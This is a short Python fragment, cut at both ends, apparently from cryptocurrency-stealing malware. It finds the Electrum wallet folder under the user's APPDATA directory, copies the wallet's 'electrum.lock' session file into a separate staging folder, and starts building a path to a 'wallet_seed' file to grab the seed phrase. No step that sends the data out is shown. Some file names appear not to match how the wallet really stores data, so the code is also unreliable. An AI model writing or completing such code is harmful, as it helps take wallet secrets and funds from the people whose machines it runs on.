...
# Get the wallet path
wallet_path = os.path.join(os.getenv("APPDATA"), "Electrum")

# Copy the session files to the folder path
session_files = [file for file in os.listdir(wallet_path) if file == "electrum.lock"]
for session_file in session_files:
    shutil.copy(os.path.join(wallet_path, session_file), os.path.join(folder_path, session_file))

# Get the seed phrase
seed_path = os.path.join(wallet_path, "wallet_seed")
